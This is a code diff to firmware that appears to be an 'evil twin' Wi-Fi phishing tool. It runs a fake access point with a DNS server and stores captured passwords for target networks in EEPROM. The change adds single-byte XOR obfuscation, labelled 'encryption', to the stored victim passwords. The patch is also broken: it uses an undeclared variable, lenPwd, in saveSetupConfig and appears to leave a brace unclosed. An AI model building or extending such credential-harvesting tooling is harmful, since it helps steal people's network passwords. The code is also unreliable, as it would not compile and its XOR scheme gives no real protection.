@@ -21,6 +21,14 @@
    Attack Timeout: 1 B. Offset = 1108 */
 enum { EE_BSSID = 0, EE_SSID = 6, EE_CH = 39, EE_PWD_HEAD = 40, EE_PWD_DATA = 41, EE_SETUP_PWD = 681, EE_SETUP_SSID = 745, EE_PWD_SSID_DATA = 778, EE_ATTACK_TIMEOUT = 1108 };
 
+#define ENCRYPT_KEY 0x8C  /* Secret key for XOR EEPROM encryption */
+
+static void xorBuffer(uint8_t *data, int len) {
+    for (int i = 0; i < len; i++) {
+        data[i] ^= ENCRYPT_KEY;
+    }
+}
+
 /* ================================================================== */
 IPAddress           apIP(192, 168, 4, 1);
 DNSServer           dnsServer;
@@ -154,10 +162,13 @@ static void savePwd(const char *pwd)
     int len = strlen(pwd);
     if (len > PWD_MAX_LEN - 1) len = PWD_MAX_LEN - 1;
     
-    for (int i = 0; i < len; i++)
-        EEPROM.write(offset + i, (uint8_t)pwd[i]);
-    for (int i = len; i < PWD_MAX_LEN; i++)
-        EEPROM.write(offset + i, 0x00);
+    uint8_t buf[PWD_MAX_LEN];
+    for (int i = 0; i < len; i++) buf[i] = (uint8_t)pwd[i];
+    for (int i = len; i < PWD_MAX_LEN; i++) buf[i] = 0x00;
+    
+    xorBuffer(buf, PWD_MAX_LEN);
+    for (int i = 0; i < PWD_MAX_LEN; i++)
+        EEPROM.write(offset + i, buf[i]);
         
     int offsetSSID = EE_PWD_SSID_DATA + head * 33;
     int lenSSID = strlen(targetSSID);
@@ -188,19 +199,27 @@ static void loadPwd(void)
         int offset = EE_PWD_DATA + idx * PWD_MAX_LEN;
         int offsetSSID = EE_PWD_SSID_DATA + idx * 33;
         
-        char tmp[PWD_MAX_LEN + 1];
-        for (int j = 0; j < PWD_MAX_LEN; j++)
-            tmp[j] = (char)EEPROM.read(offset + j);
-        tmp[PWD_MAX_LEN] = '\0';
+        uint8_t buf[PWD_MAX_LEN];
+        bool isErased = true;
+        for (int j = 0; j < PWD_MAX_LEN; j++) {
+            buf[j] = EEPROM.read(offset + j);
+            if (buf[j] != 0xFF) isErased = false;
+        }
         
         char tmpS[33];
         for (int j = 0; j < 33; j++)
             tmpS[j] = (char)EEPROM.read(offsetSSID + j);
         tmpS[32] = '\0';
         
-        if ((uint8_t)tmp[0] != 0xFF && tmp[0] != '\0') {
-            strncpy(pwdHistory[pwdCount], tmp, PWD_MAX_LEN);
-            pwdHistory[pwdCount][PWD_MAX_LEN] = '\0';
+        if (!isErased) {
+            xorBuffer(buf, PWD_MAX_LEN);
+            char tmp[PWD_MAX_LEN + 1];
+            for (int j = 0; j < PWD_MAX_LEN; j++) tmp[j] = (char)buf[j];
+            tmp[PWD_MAX_LEN] = '\0';
+            
+            if (tmp[0] != '\0') {
+                strncpy(pwdHistory[pwdCount], tmp, PWD_MAX_LEN);
+                pwdHistory[pwdCount][PWD_MAX_LEN] = '\0';
             
             if ((uint8_t)tmpS[0] != 0xFF && tmpS[0] != '\0') {
                 strncpy(pwdHistorySSID[pwdCount], tmpS, 32);
@@ -218,10 +237,12 @@ static void loadPwd(void)
 static void saveSetupConfig(const char *ssid, const char *pwd, uint8_t timeout)
 {
     EEPROM.begin(EE_SIZE);
-    int lenPwd = strlen(pwd);
-    if (lenPwd > PWD_MAX_LEN - 1) lenPwd = PWD_MAX_LEN - 1;
-    for (int i = 0; i < lenPwd; i++) EEPROM.write(EE_SETUP_PWD + i, (uint8_t)pwd[i]);
-    for (int i = lenPwd; i < PWD_MAX_LEN; i++) EEPROM.write(EE_SETUP_PWD + i, 0x00);
+    uint8_t buf[PWD_MAX_LEN];
+    for (int i = 0; i < lenPwd; i++) buf[i] = (uint8_t)pwd[i];
+    for (int i = lenPwd; i < PWD_MAX_LEN; i++) buf[i] = 0x00;
+    
+    xorBuffer(buf, PWD_MAX_LEN);
+    for (int i = 0; i < PWD_MAX_LEN; i++) EEPROM.write(EE_SETUP_PWD + i, buf[i]);
     
     int lenSSID = strlen(ssid);
     if (lenSSID > 32) lenSSID = 32;
@@ -243,9 +264,12 @@ static void saveSetupConfig(const char *ssid, const char *pwd, uint8_t timeout)
 static void loadSetupConfig(void)
 {
     EEPROM.begin(EE_SIZE);
-    char tmpP[PWD_MAX_LEN + 1];
-    for (int i = 0; i < PWD_MAX_LEN; i++) tmpP[i] = (char)EEPROM.read(EE_SETUP_PWD + i);
-    tmpP[PWD_MAX_LEN] = '\0';
+    uint8_t bufP[PWD_MAX_LEN];
+    bool isErasedP = true;
+    for (int i = 0; i < PWD_MAX_LEN; i++) {
+        bufP[i] = EEPROM.read(EE_SETUP_PWD + i);
+        if (bufP[i] != 0xFF) isErasedP = false;
+    }
     
     char tmpS[33];
     for (int i = 0; i < 33; i++) tmpS[i] = (char)EEPROM.read(EE_SETUP_SSID + i);
@@ -257,9 +281,18 @@ static void loadSetupConfig(void)
     
     EEPROM.end();
     
-    if ((uint8_t)tmpP[0] != 0xFF && tmpP[0] != '\0') {
-        strncpy(setupPwd, tmpP, PWD_MAX_LEN);
-        setupPwd[PWD_MAX_LEN] = '\0';
+    if (!isErasedP) {
+        xorBuffer(bufP, PWD_MAX_LEN);
+        char tmpP[PWD_MAX_LEN + 1];
+        for (int i = 0; i < PWD_MAX_LEN; i++) tmpP[i] = (char)bufP[i];
+        tmpP[PWD_MAX_LEN] = '\0';
+        
+        if (tmpP[0] != '\0') {
+            strncpy(setupPwd, tmpP, PWD_MAX_LEN);
+            setupPwd[PWD_MAX_LEN] = '\0';
+        } else {
+            strcpy(setupPwd, "12345678");
+        }
     } else {
         strcpy(setupPwd, "12345678");
     }
